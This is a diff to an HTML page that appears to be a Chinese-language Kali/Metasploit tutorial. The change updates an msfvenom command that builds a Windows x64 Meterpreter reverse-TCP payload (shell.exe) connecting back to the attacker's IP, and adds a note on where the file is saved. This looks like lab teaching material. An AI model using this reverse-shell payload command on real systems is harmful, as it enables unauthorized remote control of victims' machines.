@@ -24,8 +24,10 @@
         <img src="picture/25.png" alt=""><hr>
     </div>
     <div class="background">
-        <h3>生成被控端命令:msfconsole中输入:msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=4444 -f exe >shell.exe</h3>
-        <img src="picture/26.png" alt="">
+        <h3>生成被控端命令:msfconsole中输入:msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.108 lport=4444 -f exe >shell.exe</h3>
+        <img src="picture/26.png" alt=""><hr>
+        <h3>正常情况下生成的被控端一般在桌面,如果没有就是在 /kali/home路径。可通过R>指定生成位置</h3>
+        <img src="picture/27（1）.png" alt="">
         <h3>ps:lhost为攻击端ip地址(kali的ip,不是windows的ip)</h3>
         <h3>生成的被控端在桌面名为shell.exe</h3>
     </div>
